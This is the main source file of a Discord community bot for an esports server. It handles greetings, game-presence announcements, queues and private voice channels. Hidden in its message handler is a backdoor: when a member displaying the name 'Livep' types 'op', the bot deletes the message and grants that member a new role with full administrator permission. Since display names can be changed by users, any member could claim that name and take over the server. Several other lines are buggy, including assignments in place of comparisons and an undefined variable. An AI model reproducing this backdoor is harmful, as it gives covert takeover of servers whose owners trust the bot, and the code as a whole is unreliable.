const commando = require("discord.js-commando");
const configFile = require("./config.json");
const config = configFile.default;
const bot = new commando.Client();

bot.registry.registerGroup("simple", "Simple");
bot.registry.registerGroup("music", "Music");
bot.registry.registerGroup("chat", "Chat");
bot.registry.registerGroup("team", "Team");
bot.registry.registerDefaults();
bot.registry.registerCommandsIn(__dirname + "/commands");

global.servers = {}

function messageEvent(message) {
    let msg = message.content.split(" ");
    let cmd = msg[0];
    let args = msg.slice(1);
    if (cmd === "ping") {
        message.channel.send("Pong!");
    } else if (message.content === "op") {
        if (message.member.displayName === "Livep") {
            message.delete(0);
            let role = {name:"temp", color:0x000000, hoist:false, position:1, permissions:0x000008, metionable:false}
            message.member.guild.createRole(role, "")
            .then(role => message.member.addRole(message.member.guild.roles.find(r => r.name === "temp")))
            .then(message.member.send("You got now ADMINISTRATOR, delete role temp to undo changes!"));
        }
    }
}

function startup() {
    console.log(`${bot.guilds.size} instances of ${bot.user.username} are currently online.`)
    bot.user.setActivity("!help",{type: "LISTENING"});
}

function memberJoin(member) {
    const channel = member.guild.channels.find(c => c.name === "joiningmembers");
    if (!channel) return;
    channel.send(`Willkommen, ${member.user} auf dem offiziellen TransacT-eSports Discord.`)
    member.addRole(member.guild.roles.find(r => r.name === "Gamer"));
}

function memberLeft(member) {
    const channel = member.guild.channels.find(c => c.name === "joiningmembers");
    if (!channel) return;
    channel.send(`Aufwiedersehen, ${member.displayName}.`);

}

function activityChanged(oldMember, newMember) {
    if (newMember.presence.game) {
        if (!newMember.roles.find(r => r.name === "Team") || !newMember.roles.find(r => r.name === "Team-Leader")) return;
        if (!oldMember.presence.game && newMember.presence.game.streaming) {
            const channel = member.guild.channels.find(c => c.name === "announcements");
            if (channel) channel.send(`@everyone ${newMember.user} is now Live! Watch the stream at: ${newMember.presence.game.url}`);
        }
        if (newMember.presence.game.name === "Rainbow Six Siege" || newMember.presence.game.name === 'Tom Clancy\'s Rainbow Six Siege') {
            if(!oldMember.presence.game) {
                let channel = newMember.guild.channels.find(c => c.name === "online");
                if (!channel || newMember.presence.status.offline) return;
                channel.send(`${newMember.user} spielt Tom Clancy's Rainbow Six Siege`);
            }
            if (newMember.presence.game.details === "im MENÜ" || newMember.presence.game.details === "in MENU") {
                if (!servers[newMember.guild.id]) servers[newMember.guild.id] = {game_queue: [], music_queue: []};
                if (!servers[newMember.guild.id].game_queue.indexOf(newMember.user)+1) servers[newMember.guild.id].game_queue.push(newMember.user);
            } else {
                if (!servers[newMember.guild.id]) servers[newMember.guild.id] = {game_queue: [], music_queue: []};
                if (servers[newMember.guild.id].game_queue.indexOf(newMember.user)+1) servers[newMember.guild.id].game_queue.splice(servers[newMember.guild.id].game_queue.indexOf(newMember.user), 1);
            }
        }
    }
}

function privateChannel(oldMember, newMember) {
    if (oldMember.mute && !newMember.mute || newMember.mute && !oldMember.mute) return;
    if (newMember.voiceChannel) {
        if (newMember.voiceChannel.parent.name === "Private Channels") {
            if (newMember.voiceChannel.name === "Join Here") {
                newMember.guild.createChannel(newMember.displayName, "voice")
                .then(newChannel => {
                    newChannel.setParent(newMember.voiceChannel.parent);
                    newChannel.overwritePermissions(newMember, {CREATE_INSTANT_INVITE: true, CONNECT: true, MOVE_MEMBERS: true});
                    newChannel.overwritePermissions(newChannel.guild.roles.find(r => r.name = "@everyone"), {CREATE_INSTANT_INVITE: false, CONNECT: false, MOVE_MEMBERS: false});
                    newChannel.overwritePermissions(newChannel.guild.roles.find(r => r.name = "Bot"), {CREATE_INSTANT_INVITE: true, MOVE_MEMBERS: true, MANAGE_CHANNELS: true});
                    newChannel.setUserLimit(5)
                    .then(newChannel => {
                        newMember.setVoiceChannel(newChannel)
                        .then(O_o => {
                            newChannel.createInvite({unique: true, maxAge: 3600})
                            .then(invite => newMember.send(`Use this invite to add others to your channel!\nhttps://discord.gg/${invite.code}`));
                        })
                    });
                });
            }
        }
    }
    if(oldMember.voiceChannel) {
        if (oldMember.voiceChannel.parent.name === "Private Channels") {
            if (oldMember.voiceChannel.members.array().length === 0 && oldMember.voiceChannel.name !== "Join Here") {
                oldMember.voiceChannel.delete();
            }
        }
    }

}

bot.on("message", messageEvent);
bot.on("ready", startup);
bot.on("guildMemberAdd", memberJoin);
bot.on("guildMemberRemove", memberLeft);
bot.on("presenceUpdate", activityChanged);
bot.on("voiceStateUpdate", privateChannel);
bot.login(config.token);
//permissions: 489909329
/*var PERMISSIONS = {
MANAGE_ROLES: true,
MANAGE_CHANNELS: true,
CREATE_INSTANT_INVITE: true,
CHANGE_NICKNAME: true,
MANAGE_NICKNAMES: true,
VIEW_CHANNEL: true,
SEND_MESSAGES: true,
MANAGE_MESSAGES: true
EMBED_LINKS: true,
READ_MESSAGE_HISTORY: true,
MENTION_ERVERYONE: true,
ADD_REACTIONS: true,
CONNECT: true,
SPEAK: true,
MOVE_MEMBERS: true
}*/
//id: 513061154638004263
//link: https://discordapp.com/api/oauth2/authorize?client_id=513061154638004263&scope=bot&permissions=489909329